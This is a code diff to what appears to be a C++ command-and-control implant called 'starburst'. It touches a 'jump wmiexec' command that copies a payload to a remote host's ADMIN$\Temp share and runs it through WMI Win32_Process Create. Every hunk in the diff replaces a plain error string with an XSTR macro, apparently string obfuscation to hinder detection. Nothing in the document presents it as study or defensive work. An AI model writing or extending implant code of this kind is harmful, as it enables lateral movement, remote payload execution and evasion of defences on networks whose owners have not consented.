@@ -74,7 +74,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     auto host_str = parser_string( params, &host_len );
     if ( !host_str || host_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
+            XSTR( "no hostname provided" ) );
         return;
     }
 
@@ -82,7 +82,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     auto filename_str = parser_string( params, &filename_len );
     if ( !filename_str || filename_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no filename provided" ) ) );
+            XSTR( "no filename provided" ) );
         return;
     }
 
@@ -90,7 +90,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     auto payload_data = reinterpret_cast<uint8_t*>( parser_bytes( params, &payload_len ) );
     if ( !payload_data || payload_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no payload data provided" ) ) );
+            XSTR( "no payload data provided" ) );
         return;
     }
 
@@ -99,7 +99,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     int uidx = 2;
     for ( uint32_t i = 0; i < host_len && uidx < 480; i++ )
         unc_path[uidx++] = host_str[i];
-    char admin_suffix[] = { '\\','A','D','M','I','N','$','\\','T','e','m','p','\\', 0 };
+    xstr(admin_suffix, "\\ADMIN$\\Temp\\");
     for ( int i = 0; admin_suffix[i] && uidx < 500; i++ )
         unc_path[uidx++] = admin_suffix[i];
     for ( uint32_t i = 0; i < filename_len && uidx < 510; i++ )
@@ -122,7 +122,7 @@ auto declfn starburst::cmd_jump_wmiexec(
         unc_path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr );
     if ( h_file == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to create file on remote host - check ADMIN$ access" ) ) );
+            XSTR( "failed to create file on remote host - check ADMIN$ access" ) );
         return;
     }
 
@@ -133,7 +133,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     if ( !write_ok || written != payload_len ) {
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to write payload to remote host" ) ) );
+            XSTR( "failed to write payload to remote host" ) );
         return;
     }
 
@@ -146,7 +146,7 @@ auto declfn starburst::cmd_jump_wmiexec(
     if ( !h_ole32 || !h_oleaut32 ) {
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
+            XSTR( "failed to load COM libraries" ) );
         return;
     }
 
@@ -176,7 +176,7 @@ auto declfn starburst::cmd_jump_wmiexec(
          !pSysAllocString || !pSysFreeString ) {
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
+            XSTR( "failed to resolve COM APIs" ) );
         return;
     }
 
@@ -201,7 +201,7 @@ auto declfn starburst::cmd_jump_wmiexec(
         pCoUninitialize();
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CoCreateInstance WbemLocator failed" ) ) );
+            XSTR( "CoCreateInstance WbemLocator failed" ) );
         return;
     }
 
@@ -215,7 +215,7 @@ auto declfn starburst::cmd_jump_wmiexec(
         pCoUninitialize();
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "ConnectServer failed - check perms/network" ) ) );
+            XSTR( "ConnectServer failed - check perms/network" ) );
         return;
     }
 
@@ -233,7 +233,7 @@ auto declfn starburst::cmd_jump_wmiexec(
         pCoUninitialize();
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetObject Win32_Process failed" ) ) );
+            XSTR( "GetObject Win32_Process failed" ) );
         return;
     }
 
@@ -251,7 +251,7 @@ auto declfn starburst::cmd_jump_wmiexec(
         pCoUninitialize();
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetMethod Create failed" ) ) );
+            XSTR( "GetMethod Create failed" ) );
         return;
     }
 
@@ -294,11 +294,11 @@ auto declfn starburst::cmd_jump_wmiexec(
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "payload staged and executed via WMI" ) ) );
+            XSTR( "payload staged and executed via WMI" ) );
     } else {
         inst.kernel32.DeleteFileW( w_unc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "payload staged but WMI ExecMethod failed" ) ) );
+            XSTR( "payload staged but WMI ExecMethod failed" ) );
     }
 }
 
